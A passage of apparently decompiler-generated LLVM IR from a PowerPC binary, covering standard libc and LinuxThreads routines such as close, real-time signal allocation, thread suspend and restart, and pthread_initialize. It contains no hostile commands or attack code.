  %v2_10013bfc = call i32 @__libc_fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_10013bfc, i32* @r29, align 4
  %v3_10013c04 = load i32, i32* %stack_var_-40, align 4
  store i32 268516368, i32* @lr, align 4
  %v2_10013c0c = trunc i32 %v3_10013c04 to i8
  %v3_10013c0c = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013c0c, i32 0)
  %v0_10013c14 = load i32, i32* @r29, align 4
  ret i32 %v0_10013c14
}

define i32 @close(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013c34 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268516424, i32* @lr, align 4
  %v3_10013c44 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013c34)
  store i32 268516432, i32* @lr, align 4
  %v1_10013c4c = call i32 @__libc_close(i32 %arg1)
  %v3_10013c58 = load i32, i32* %stack_var_-40, align 4
  store i32 268516448, i32* @lr, align 4
  %v2_10013c5c = trunc i32 %v3_10013c58 to i8
  %v3_10013c5c = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013c5c, i32 0)
  ret i32 %v1_10013c4c

; uselistorder directives
  uselistorder i32 (i8, i32)* @__GI_pthread_setcanceltype, { 44, 45, 34, 35, 0, 1, 2, 3, 4, 5, 6, 7, 52, 53, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 38, 39, 22, 23, 24, 25, 32, 33, 50, 51, 46, 47, 42, 43, 48, 49, 26, 27, 28, 29, 36, 37, 30, 31, 40, 41 }
}

define i32 @__libc_current_sigrtmin() local_unnamed_addr {
entry:
  %v3_10013c7c = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @global_var_10040d58.979, i32 0, i32 0), align 4
  ret i32 %v3_10013c7c
}

define i32 @__libc_current_sigrtmax() local_unnamed_addr {
entry:
  %v3_10013c88 = load i32, i32* @global_var_10040d5c.980, align 4
  ret i32 %v3_10013c88
}

define i32 @__libc_allocate_rtsig(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10013c98 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @global_var_10040d58.979, i32 0, i32 0), align 4
  %v3_10013c9c = icmp eq i32 %v3_10013c98, -1
  br i1 %v3_10013c9c, label %dec_label_pc_10013cd4, label %dec_label_pc_10013ca4

dec_label_pc_10013ca4:                            ; preds = %entry
  %v3_10013ca4 = load i32, i32* @global_var_10040d5c.980, align 4
  %v3_10013cac = icmp sgt i32 %v3_10013c98, %v3_10013ca4
  br i1 %v3_10013cac, label %dec_label_pc_10013cd4, label %dec_label_pc_10013cb4

dec_label_pc_10013cb4:                            ; preds = %dec_label_pc_10013ca4
  %v3_10013ca8 = icmp eq i32 %arg1, 0
  br i1 %v3_10013ca8, label %dec_label_pc_10013cc8, label %dec_label_pc_10013cc0

dec_label_pc_10013cc0:                            ; preds = %dec_label_pc_10013cb4
  %v1_10013cb4 = add i32 %v3_10013c98, 1
  store i32 %v1_10013cb4, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @global_var_10040d58.979, i32 0, i32 0), align 4
  br label %dec_label_pc_10013cd8

dec_label_pc_10013cc8:                            ; preds = %dec_label_pc_10013cb4
  %v1_10013cb8 = add i32 %v3_10013ca4, -1
  store i32 %v1_10013cb8, i32* @global_var_10040d5c.980, align 4
  br label %dec_label_pc_10013cd8

dec_label_pc_10013cd4:                            ; preds = %dec_label_pc_10013ca4, %entry
  br label %dec_label_pc_10013cd8

dec_label_pc_10013cd8:                            ; preds = %dec_label_pc_10013cc8, %dec_label_pc_10013cc0, %dec_label_pc_10013cd4
  %v0_10013cd8 = phi i32 [ %v3_10013ca4, %dec_label_pc_10013cc8 ], [ %v3_10013c98, %dec_label_pc_10013cc0 ], [ -1, %dec_label_pc_10013cd4 ]
  ret i32 %v0_10013cd8

; uselistorder directives
  uselistorder label %dec_label_pc_10013cd8, { 2, 0, 1 }
}

define i32 @__GI_pthread_self() local_unnamed_addr {
entry:
  %v0_10013ce0 = load i32, i32* @r2, align 4
  %v1_10013ce0 = add i32 %v0_10013ce0, 16
  %v2_10013ce0 = inttoptr i32 %v1_10013ce0 to i32*
  %v3_10013ce0 = load i32, i32* %v2_10013ce0, align 4
  ret i32 %v3_10013ce0
}

define i32 @pthread_equal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_handle_sigdebug() local_unnamed_addr {
entry:
  %v0_10013cf8 = load i32, i32* @r3, align 4
  ret i32 %v0_10013cf8
}

define i32 @__pthread_setconcurrency(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_100451f4.981, align 4
  ret i32 0
}

define i32 @__pthread_getconcurrency() local_unnamed_addr {
entry:
  %v3_10013d10 = load i32, i32* @global_var_100451f4.981, align 4
  ret i32 %v3_10013d10
}

define i32 @__pthread_timedsuspend_new(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-904 = alloca i32, align 4
  %stack_var_-760 = alloca i32, align 4
  %stack_var_-888 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  store i32 1, i32* @r4, align 4
  store i32 268516668, i32* @lr, align 4
  %v3_10013d38 = call i32 @__sigsetjmp(i32* nonnull %stack_var_-624, i32 1)
  %v3_10013d3c = icmp eq i32 %v3_10013d38, 0
  store i32 1, i32* %r9.global-to-local, align 4
  br i1 %v3_10013d3c, label %dec_label_pc_10013d48, label %entry.dec_label_pc_10013e08_crit_edge

entry.dec_label_pc_10013e08_crit_edge:            ; preds = %entry
  %.pre = add i32 %arg1, 36
  %.pre1 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_10013e08

dec_label_pc_10013d48:                            ; preds = %entry
  %v2_10013d24 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v2_10013d50 = ptrtoint i32* %stack_var_-888 to i32
  store i32 %v2_10013d50, i32* @r29, align 4
  %v2_10013d54 = add i32 %arg1, 36
  %v3_10013d54 = inttoptr i32 %v2_10013d54 to i32*
  store i32 %v2_10013d24, i32* %v3_10013d54, align 4
  %v1_10013d58 = load i32, i32* %r9.global-to-local, align 4
  %v2_10013d58 = add i32 %v1_10013d58, 32
  %v3_10013d58 = inttoptr i32 %v2_10013d58 to i32*
  store i32 0, i32* %v3_10013d58, align 4
  store i32 %v2_10013d50, i32* @r3, align 4
  store i32 268516708, i32* @lr, align 4
  %v1_10013d60 = call i32 @sigemptyset(i32 %v2_10013d50)
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10013d68 = load i32, i32* @global_var_10045104.982, align 4
  store i32 %v2_10013d50, i32* @r3, align 4
  store i32 268516724, i32* @lr, align 4
  %v2_10013d70 = call i32 @__GI_sigaddset(i32 %v2_10013d50, i32 %v3_10013d68)
  %v2_10013d7c = ptrtoint i32* %stack_var_-760 to i32
  store i32 268516740, i32* @lr, align 4
  %v3_10013d80 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_10013d50, i32 %v2_10013d7c)
  %v2_10013d88 = ptrtoint i32* %stack_var_-904 to i32
  %v1_10013da4 = add i32 %tmp, 4
  %v2_10013da4 = inttoptr i32 %v1_10013da4 to i32*
  br label %dec_label_pc_10013d84

dec_label_pc_10013d84:                            ; preds = %dec_label_pc_10013de8, %dec_label_pc_10013d48
  store i32 268516752, i32* @lr, align 4
  %v2_10013d8c = call i32 @gettimeofday(i32 %v2_10013d88, i32 0)
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v3_10013da4 = load i32, i32* %v2_10013da4, align 4
  %v2_10013da8 = load i32, i32* %arg2, align 4
  %tmp16 = mul i32 %tmp4, -1000
  %v2_10013dac = add i32 %v3_10013da4, %tmp16
  store i32 %v2_10013dac, i32* @r11, align 4
  %v3_10013db0 = load i32, i32* %stack_var_-904, align 4
  %v2_10013dbc = sub i32 %v2_10013da8, %v3_10013db0
  store i32 %v2_10013dbc, i32* %r9.global-to-local, align 4
  %not.tmp15 = icmp slt i32 %v2_10013dac, 0
  %v1_10013dc4 = sext i1 %not.tmp15 to i32
  %v2_10013dbc.v1_10013dc4 = add i32 %v2_10013dbc, %v1_10013dc4
  %v1_10013de0 = icmp slt i32 %v2_10013dbc.v1_10013dc4, 0
  br i1 %v1_10013de0, label %dec_label_pc_10013df4, label %dec_label_pc_10013de8

dec_label_pc_10013de8:                            ; preds = %dec_label_pc_10013d84
  store i32 268516844, i32* @lr, align 4
  %v0_10013de8 = call i32 @__libc_nanosleep()
  %v3_10013dec = icmp eq i32 %v0_10013de8, 0
  br i1 %v3_10013dec, label %dec_label_pc_10013df4, label %dec_label_pc_10013d84

dec_label_pc_10013df4:                            ; preds = %dec_label_pc_10013de8, %dec_label_pc_10013d84
  store i32 ptrtoint ([3 x i8]* @global_var_10013e04.983 to i32), i32* @lr, align 4
  %v3_10013e00 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10013d7c, i32 0)
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013e08

dec_label_pc_10013e08:                            ; preds = %entry.dec_label_pc_10013e08_crit_edge, %dec_label_pc_10013df4
  %v3_10013e10.pre-phi = phi i32* [ %.pre1, %entry.dec_label_pc_10013e08_crit_edge ], [ %v3_10013d54, %dec_label_pc_10013df4 ]
  store i32 %arg1, i32* @r10, align 4
  store i32 0, i32* %v3_10013e10.pre-phi, align 4
  %v0_10013e1c = load i32, i32* %r9.global-to-local, align 4
  ret i32 %v0_10013e1c

; uselistorder directives
  uselistorder i32 %v2_10013dac, { 1, 0 }
  uselistorder i32 %v2_10013d50, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %stack_var_-624, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 6, 0, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 ()* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10013e08, { 1, 0 }
}

define i32 @__pthread_restart_new() local_unnamed_addr {
entry:
  %v0_10013e44 = load i32, i32* @r3, align 4
  %v1_10013e44 = add i32 %v0_10013e44, 20
  %v2_10013e44 = inttoptr i32 %v1_10013e44 to i32*
  %v3_10013e44 = load i32, i32* %v2_10013e44, align 4
  %v3_10013e48 = load i32, i32* @global_var_10045104.982, align 4
  store i32 268516944, i32* @lr, align 4
  %v2_10013e4c = call i32 @kill(i32 %v3_10013e44, i32 %v3_10013e48)
  ret i32 %v2_10013e4c
}

define i32 @__pthread_wait_for_restart_signal() local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %v2_10013e70 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_10013e70, i32* @r29, align 4
  %v0_10013e74 = load i32, i32* @r3, align 4
  store i32 %v0_10013e74, i32* @r31, align 4
  store i32 268517000, i32* @lr, align 4
  %v3_10013e84 = call i32 @__GI_sigprocmask(i32 2, i32 0, i32 %v2_10013e70)
  store i32 %v2_10013e70, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10013e98.984 to i32), i32* @lr, align 4
  %v1_10013e94 = call i32 @__GI_sigdelset(i32 %v2_10013e70)
  %v1_10013e9c = load i32, i32* @r31, align 4
  %v2_10013e9c = add i32 %v1_10013e9c, 32
  %v3_10013e9c = inttoptr i32 %v2_10013e9c to i32*
  store i32 0, i32* %v3_10013e9c, align 4
  br label %dec_label_pc_10013ea0

dec_label_pc_10013ea0:                            ; preds = %dec_label_pc_10013ea0, %entry
  store i32 268517032, i32* @lr, align 4
  %v1_10013ea4 = call i32 @__libc_sigsuspend(i32 %v2_10013e70)
  %v3_10013eac = load i32, i32* @global_var_10045104.982, align 4
  store i32 %v3_10013eac, i32* @r9, align 4
  %v0_10013eb0 = load i32, i32* @r31, align 4
  %v1_10013eb0 = add i32 %v0_10013eb0, 32
  %v2_10013eb0 = inttoptr i32 %v1_10013eb0 to i32*
  %v3_10013eb0 = load i32, i32* %v2_10013eb0, align 4
  %v4_10013eb4 = icmp eq i32 %v3_10013eb0, %v3_10013eac
  br i1 %v4_10013eb4, label %dec_label_pc_10013ebc, label %dec_label_pc_10013ea0

dec_label_pc_10013ebc:                            ; preds = %dec_label_pc_10013ea0
  ret i32 %v1_10013ea4

; uselistorder directives
  uselistorder i32 %v2_10013e70, { 1, 3, 2, 0, 4 }
}

define i32 @suspend(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10013ed4 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10013ed4
}

define i32 @pthread_onexit_process(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_10013ee8 = load i32, i32* @r2, align 4
  store i32 %v0_10013ee8, i32* @r31, align 4
  %v3_10013ef0 = load i32, i32* @global_var_100450e4.985, align 4
  %v1_10013ef4 = icmp slt i32 %v3_10013ef0, 0
  br i1 %v1_10013ef4, label %entry.dec_label_pc_10013f78_crit_edge, label %dec_label_pc_10013efc

entry.dec_label_pc_10013f78_crit_edge:            ; preds = %entry
  %v0_10013f88.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013f78

dec_label_pc_10013efc:                            ; preds = %entry
  store i32 %v0_10013ee8, i32* %stack_var_-168, align 4
  %v2_10013f10 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v3_10013ef0, i32* %r3.global-to-local, align 4
  store i32 268517152, i32* @lr, align 4
  %v2_10013f1c9 = call i32 @__libc_write(i32 %v3_10013ef0, i32 %v2_10013f10)
  store i32 %v2_10013f1c9, i32* %r3.global-to-local, align 4
  %v3_10013f2012 = icmp eq i32 %v2_10013f1c9, -1
  br i1 %v3_10013f2012, label %dec_label_pc_10013f28, label %dec_label_pc_10013f38

dec_label_pc_10013f28:                            ; preds = %dec_label_pc_10013efc, %dec_label_pc_10013f28.dec_label_pc_10013f0c_crit_edge
  %v0_10013f28 = call i32 @__errno_location()
  store i32 %v0_10013f28, i32* %r3.global-to-local, align 4
  %v1_10013f2c = inttoptr i32 %v0_10013f28 to i32*
  %v2_10013f2c = load i32, i32* %v1_10013f2c, align 4
  %v3_10013f30 = icmp eq i32 %v2_10013f2c, 4
  br i1 %v3_10013f30, label %dec_label_pc_10013f28.dec_label_pc_10013f0c_crit_edge, label %dec_label_pc_10013f38

dec_label_pc_10013f28.dec_label_pc_10013f0c_crit_edge: ; preds = %dec_label_pc_10013f28
  %v3_10013f14.pre = load i32, i32* @global_var_100450e4.985, align 4
  store i32 %v3_10013f14.pre, i32* %r3.global-to-local, align 4
  store i32 268517152, i32* @lr, align 4
  %v2_10013f1c = call i32 @__libc_write(i32 %v3_10013f14.pre, i32 %v2_10013f10)
  store i32 %v2_10013f1c, i32* %r3.global-to-local, align 4
  %v3_10013f20 = icmp eq i32 %v2_10013f1c, -1
  br i1 %v3_10013f20, label %dec_label_pc_10013f28, label %dec_label_pc_10013f38

dec_label_pc_10013f38:                            ; preds = %dec_label_pc_10013f28, %dec_label_pc_10013f28.dec_label_pc_10013f0c_crit_edge, %dec_label_pc_10013efc
  %v0_10013f38 = load i32, i32* @r31, align 4
  store i32 %v0_10013f38, i32* @r3, align 4
  store i32 268517184, i32* @lr, align 4
  %v1_10013f3c = call i32 @suspend(i32 %v0_10013f38)
  store i32 %v1_10013f3c, i32* %r3.global-to-local, align 4
  %v3_10013f44 = load i32, i32* inttoptr (i32 268718304 to i32*), align 32
  %v0_10013f48 = load i32, i32* @r31, align 4
  %v4_10013f48 = icmp eq i32 %v0_10013f48, %v3_10013f44
  br i1 %v4_10013f48, label %dec_label_pc_10013f50, label %dec_label_pc_10013f78

dec_label_pc_10013f50:                            ; preds = %dec_label_pc_10013f38
  %v3_10013f58 = load i32, i32* @global_var_10040ad4.986, align 4
  store i32 %v3_10013f58, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10013f64.987 to i32), i32* @lr, align 4
  %v3_10013f60 = call i32 @waitpid(i32 %v3_10013f58, i32 0, i32 -2147483648)
  store i32 %v3_10013f60, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_100451e0.988, align 4
  store i32 0, i32* @global_var_100451e4.989, align 4
  br label %dec_label_pc_10013f78

dec_label_pc_10013f78:                            ; preds = %entry.dec_label_pc_10013f78_crit_edge, %dec_label_pc_10013f38, %dec_label_pc_10013f50
  %v0_10013f88 = phi i32 [ %v0_10013f88.pre, %entry.dec_label_pc_10013f78_crit_edge ], [ %v1_10013f3c, %dec_label_pc_10013f38 ], [ %v3_10013f60, %dec_label_pc_10013f50 ]
  ret i32 %v0_10013f88

; uselistorder directives
  uselistorder i32 %v2_10013f10, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 6, 7, 5, 9, 8, 0, 1 }
  uselistorder i32 268517152, { 1, 0 }
  uselistorder label %dec_label_pc_10013f78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013f38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013f28, { 1, 0 }
}

define i32 @__pthread_reset_main_thread() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %v3_10013fa4 = load i32, i32* @global_var_100450e4.985, align 4
  %v0_10013fac = load i32, i32* @r2, align 4
  store i32 %v0_10013fac, i32* @r31, align 4
  store i32 -1, i32* @r28, align 4
  %v3_10013fb4 = icmp eq i32 %v3_10013fa4, -1
  br i1 %v3_10013fb4, label %dec_label_pc_10013fec, label %dec_label_pc_10013fbc

dec_label_pc_10013fbc:                            ; preds = %entry
  %v3_10013fbc = load i32, i32* @global_var_100451e0.988, align 4
  store i32 %v3_10013fbc, i32* @r3, align 4
  store i32 268517316, i32* @lr, align 4
  %v0_10013fc0 = call i32 @free()
  %v3_10013fc4 = load i32, i32* @global_var_100450e4.985, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_100451e0.988, align 4
  store i32 0, i32* @global_var_100451e4.989, align 4
  store i32 268517340, i32* @lr, align 4
  %v1_10013fd8 = call i32 @__libc_close(i32 %v3_10013fc4)
  %v3_10013fdc = load i32, i32* @global_var_100451fc.990, align 4
  store i32 268517348, i32* @lr, align 4
  %v1_10013fe0 = call i32 @__libc_close(i32 %v3_10013fdc)
  %v0_10013fe4 = load i32, i32* @r28, align 4
  store i32 %v0_10013fe4, i32* @global_var_100450e4.985, align 4
  store i32 %v0_10013fe4, i32* @global_var_100451fc.990, align 4
  br label %dec_label_pc_10013fec

dec_label_pc_10013fec:                            ; preds = %entry, %dec_label_pc_10013fbc
  store i32 268517360, i32* @lr, align 4
  %v0_10013fec = call i32 @__libc_getpid()
  %v1_10013ff4 = load i32, i32* @r31, align 4
  %v2_10013ff4 = add i32 %v1_10013ff4, 20
  %v3_10013ff4 = inttoptr i32 %v2_10013ff4 to i32*
  store i32 %v0_10013fec, i32* %v3_10013ff4, align 4
  %v0_10013ff8 = load i32, i32* @r31, align 4
  store i32 %v0_10013ff8, i32* @global_var_100450e0, align 4
  store i32 ptrtoint (i32* @global_var_10045230.991 to i32), i32* %r9.global-to-local, align 4
  %v2_10014004 = inttoptr i32 %v0_10013ff8 to i32*
  store i32 %v0_10013ff8, i32* %v2_10014004, align 4
  %v0_10014008 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014008 = load i32, i32* @r31, align 4
  %v2_10014008 = add i32 %v1_10014008, 76
  %v3_10014008 = inttoptr i32 %v2_10014008 to i32*
  store i32 %v0_10014008, i32* %v3_10014008, align 4
  store i32 ptrtoint (i32* @global_var_1004522c.992 to i32), i32* %r9.global-to-local, align 4
  %v0_10014014 = load i32, i32* @r31, align 4
  %v2_10014014 = add i32 %v0_10014014, 4
  %v3_10014014 = inttoptr i32 %v2_10014014 to i32*
  store i32 %v0_10014014, i32* %v3_10014014, align 4
  %v0_10014018 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014018 = load i32, i32* @r31, align 4
  %v2_10014018 = add i32 %v1_10014018, 68
  %v3_10014018 = inttoptr i32 %v2_10014018 to i32*
  store i32 %v0_10014018, i32* %v3_10014018, align 4
  ret i32 %v0_10013fec

; uselistorder directives
  uselistorder i32 %v0_10014014, { 1, 0 }
  uselistorder i32 %v0_10013ff8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013fec, { 1, 0 }
}

define i32 @__pthread_kill_other_threads_np() local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  store i32 268517452, i32* @lr, align 4
  %v2_10014048 = call i32 @pthread_onexit_process(i32 0, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_10014050.993 to i32), i32* @lr, align 4
  %v0_1001404c = call i32 @__pthread_reset_main_thread()
  %v2_10014050 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_10014050, i32* @r3, align 4
  store i32 268517464, i32* @lr, align 4
  %v1_10014054 = call i32 @sigemptyset(i32 %v2_10014050)
  %v3_10014060 = load i32, i32* @global_var_10045104.982, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 268517500, i32* @lr, align 4
  %v4_10014078 = call i32 @__libc_sigaction(i32 %v3_10014060, i32* nonnull %stack_var_-168, i32 0)
  %v3_10014084 = load i32, i32* @global_var_10045108.994, align 4
  store i32 268517520, i32* @lr, align 4
  %v4_1001408c = call i32 @__libc_sigaction(i32 %v3_10014084, i32* nonnull %stack_var_-168, i32 0)
  %v3_10014094 = load i32, i32* @global_var_1004510c.995, align 4
  %tmp7 = icmp slt i32 %v3_10014094, 1
  br i1 %tmp7, label %dec_label_pc_100140ac, label %dec_label_pc_100140a8

dec_label_pc_100140a8:                            ; preds = %entry
  store i32 268517548, i32* @lr, align 4
  %v4_100140a8 = call i32 @__libc_sigaction(i32 %v3_10014094, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_100140ac

dec_label_pc_100140ac:                            ; preds = %entry, %dec_label_pc_100140a8
  %v0_100140bc = phi i32 [ %v3_10014094, %entry ], [ %v4_100140a8, %dec_label_pc_100140a8 ]
  ret i32 %v0_100140bc

; uselistorder directives
  uselistorder i32 ()* @__pthread_reset_main_thread, { 1, 0 }
  uselistorder label %dec_label_pc_100140ac, { 1, 0 }
}

define i32 @pthread_initialize(i32 %arg1) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-4194624 = alloca i32, align 4
  %v3_100140d4 = load i32, i32* @global_var_100451dc.996, align 4
  store i32 %v3_100140d4, i32* @r31, align 4
  %v3_100140d8 = icmp eq i32 %v3_100140d4, 0
  br i1 %v3_100140d8, label %dec_label_pc_100140e0, label %dec_label_pc_1001427c

dec_label_pc_100140e0:                            ; preds = %entry
  %v2_100140e0 = ptrtoint i32* %stack_var_-4194624 to i32
  %v1_100140e4 = call i32 @__asm_rlwinm(i32 %v2_100140e0, i32 0, i32 0, i32 10)
  store i32 %v1_100140e4, i32* @global_var_100451dc.996, align 4
  store i32 268517616, i32* @lr, align 4
  %v0_100140ec = call i32 @__libc_getpid()
  %v3_100140f8 = load i32, i32* bitcast (i32** @global_var_10045148.998 to i32*), align 4
  store i32 %v3_100140f8, i32* %r29.global-to-local, align 4
  %v0_10014104 = load i32, i32* @r31, align 4
  store i32 %v0_10014104, i32* @global_var_1004514c.999, align 4
  store i32 ptrtoint (i32* @global_var_100408e0 to i32), i32* @r2, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1004522c.992 to i32), i32* bitcast (i32** @global_var_10040924.1000 to i32*), align 4
  store i32 %v0_100140ec, i32* @global_var_100408f4.1001, align 4
  store i32 ptrtoint (i32* @global_var_10045230.991 to i32), i32* bitcast (i32** @global_var_1004092c.1002 to i32*), align 4
  %v3_100141444 = icmp eq i32 %v3_100140f8, 0
  br i1 %v3_100141444, label %dec_label_pc_1001414c, label %dec_label_pc_10014130

dec_label_pc_10014130:                            ; preds = %dec_label_pc_100140e0, %dec_label_pc_10014140
  %v1_1001413c = phi i32 [ %v3_10014140, %dec_label_pc_10014140 ], [ %v3_100140f8, %dec_label_pc_100140e0 ]
  %v1_10014130 = add i32 %v1_1001413c, 52
  %v2_10014130 = inttoptr i32 %v1_10014130 to i32*
  %v3_10014130 = load i32, i32* %v2_10014130, align 4
  %v3_10014134 = icmp eq i32 %v3_10014130, 1
  br i1 %v3_10014134, label %dec_label_pc_10014140, label %dec_label_pc_1001413c

dec_label_pc_1001413c:                            ; preds = %dec_label_pc_10014130
  %v0_1001413c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1001413c, i32* %v2_10014130, align 4
  %v0_10014140.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014140

dec_label_pc_10014140:                            ; preds = %dec_label_pc_10014130, %dec_label_pc_1001413c
  %v0_10014140 = phi i32 [ %v1_1001413c, %dec_label_pc_10014130 ], [ %v0_10014140.pre, %dec_label_pc_1001413c ]
  %v1_10014140 = add i32 %v0_10014140, 32
  %v2_10014140 = inttoptr i32 %v1_10014140 to i32*
  %v3_10014140 = load i32, i32* %v2_10014140, align 4
  store i32 %v3_10014140, i32* %r29.global-to-local, align 4
  %v3_10014144 = icmp eq i32 %v3_10014140, 0
  br i1 %v3_10014144, label %dec_label_pc_10014144.dec_label_pc_1001414c_crit_edge, label %dec_label_pc_10014130

dec_label_pc_10014144.dec_label_pc_1001414c_crit_edge: ; preds = %dec_label_pc_10014140
  br label %dec_label_pc_1001414c

dec_label_pc_1001414c:                            ; preds = %dec_label_pc_10014144.dec_label_pc_1001414c_crit_edge, %dec_label_pc_100140e0
  %v2_1001414c = ptrtoint i32* %stack_var_-312 to i32
  store i32 ptrtoint (i32* @global_var_1001415c.1003 to i32), i32* @lr, align 4
  %v2_10014158 = call i32 @getrlimit(i32 3, i32 %v2_1001414c)
  store i32 ptrtoint (i32* @global_var_10014160.1004 to i32), i32* @lr, align 4
  %v0_1001415c = call i32 @__GI_getpagesize()
  %tmp = mul i32 %v0_1001415c, -2
  %v2_10014168 = add i32 %tmp, 2097152
  %v3_1001416c = load i32, i32* %stack_var_-312, align 4
  %v3_10014170 = icmp ugt i32 %v3_1001416c, %v2_10014168
  br i1 %v3_10014170, label %dec_label_pc_10014178, label %dec_label_pc_10014188

dec_label_pc_10014178:                            ; preds = %dec_label_pc_1001414c
  store i32 %v2_10014168, i32* %stack_var_-312, align 4
  store i32 268517768, i32* @lr, align 4
  %v3_10014184 = call i32 @__GI_setrlimit(i32 3, i32 %v2_1001414c, i32 %v2_10014168)
  br label %dec_label_pc_10014188

dec_label_pc_10014188:                            ; preds = %dec_label_pc_1001414c, %dec_label_pc_10014178
  %v2_10014188 = ptrtoint i32* %stack_var_-172 to i32
  store i32 %v2_10014188, i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 18164), i32* %stack_var_-176, align 4
  store i32 268517796, i32* @lr, align 4
  %v1_100141a0 = call i32 @sigemptyset(i32 %v2_10014188)
  %v3_100141a4 = load i32, i32* @global_var_10045104.982, align 4
  store i32 268517820, i32* @lr, align 4
  %v4_100141b8 = call i32 @__libc_sigaction(i32 %v3_100141a4, i32* nonnull %stack_var_-176, i32 0)
  %v3_100141bc = load i32, i32* @global_var_10045104.982, align 4
  store i32 %v2_10014188, i32* @r3, align 4
  store i32 268697600, i32* @r27, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 17872), i32* %stack_var_-176, align 4
  store i32 268517848, i32* @lr, align 4
  %v2_100141d4 = call i32 @__GI_sigaddset(i32 %v2_10014188, i32 %v3_100141bc)
  %v3_100141d8 = load i32, i32* @global_var_10045108.994, align 4
  store i32 268697600, i32* %r29.global-to-local, align 4
  store i32 268517868, i32* @lr, align 4
  %v4_100141e8 = call i32 @__libc_sigaction(i32 %v3_100141d8, i32* nonnull %stack_var_-176, i32 0)
  %v3_100141ec = load i32, i32* @global_var_1004510c.995, align 4
  %tmp15 = icmp slt i32 %v3_100141ec, 1
  br i1 %tmp15, label %dec_label_pc_1001421c, label %dec_label_pc_100141f8

dec_label_pc_100141f8:                            ; preds = %dec_label_pc_10014188
  store i32 %v2_10014188, i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 15608), i32* %stack_var_-176, align 4
  store i32 268517900, i32* @lr, align 4
  %v1_10014208 = call i32 @sigemptyset(i32 %v2_10014188)
  %v3_1001420c = load i32, i32* @global_var_1004510c.995, align 4
  store i32 268517916, i32* @lr, align 4
  %v4_10014218 = call i32 @__libc_sigaction(i32 %v3_1001420c, i32* nonnull %stack_var_-176, i32 0)
  br label %dec_label_pc_1001421c

dec_label_pc_1001421c:                            ; preds = %dec_label_pc_10014188, %dec_label_pc_100141f8
  %v2_1001421c = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_1001421c, i32* %r29.global-to-local, align 4
  store i32 %v2_1001421c, i32* @r3, align 4
  store i32 268517928, i32* @lr, align 4
  %v1_10014224 = call i32 @sigemptyset(i32 %v2_1001421c)
  %v3_10014228 = load i32, i32* @global_var_10045104.982, align 4
  store i32 %v2_1001421c, i32* @r3, align 4
